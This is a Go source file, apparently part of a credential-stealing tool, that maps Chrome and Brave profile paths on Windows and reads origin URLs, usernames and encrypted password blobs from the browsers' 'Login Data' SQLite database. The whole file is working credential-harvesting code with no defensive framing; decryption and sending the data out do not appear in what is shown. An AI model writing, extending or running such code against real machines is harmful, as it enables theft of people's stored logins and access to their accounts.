package internals

import (
	"database/sql"
	"errors"
	"fmt"
	"net/url"
	"strings"
)

// Given the name of a chromium based browser it returns the
// expected base path or an error if the browser name is not valid
func getChromiumBasePath(browser string) (string, error) {
	basePaths := map[string]string{
		"chrome": "\\AppData\\Local\\Google\\Chrome\\User Data\\",
		"brave":  "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
	}

	path, ok := basePaths[browser]
	if ok {
		return path, nil
	} else {
		return string(""), errors.New("[!] Not Found")
	}
}

// Given the path for a "Login Data" file (chromiumBasePath\\LoginData)
// it returns a Credentials slice containing encrypted passwords.
// Note:
// The target browser should not be running, otherwise the "Login Data"
// file can't be opened (TODO: crating a copy could be a workaround)
func getChromiumCredentials(path string) ([]Credentials, error) {
	credentials := make([]Credentials, 0)
	db, err := sql.Open("sqlite3", path)
	if err != nil {
		panic(err)
	}
	defer db.Close()

	selectStatement := "SELECT origin_url, username_value, password_value FROM logins"
	rows, err := db.Query(selectStatement)
	if err != nil {
		return credentials, errors.New(fmt.Sprintf("%s: %s\n", "[!] Chrome Running", err.Error()))
	}

	defer rows.Close()
	for rows.Next() {
		var (
			loginUrlStr, user string
			pass              []byte
		)
		err = rows.Scan(&loginUrlStr, &user, &pass)
		if err != nil {
			return credentials, err
		}

		if loginUrlStr == "" || user == "" || pass == nil {
			continue
		}
		if strings.HasPrefix(loginUrlStr, "android") {
			loginUrlStr = strings.Split(loginUrlStr, "==@")[1]
		}

		loginUrl, err := url.Parse(loginUrlStr)
		if err != nil {
			fmt.Printf("Error parsing %s: %s\n", loginUrlStr, err.Error())
		}
		credentials = append(credentials, Credentials{loginUrl, user, pass})
	}

	return credentials, nil
}
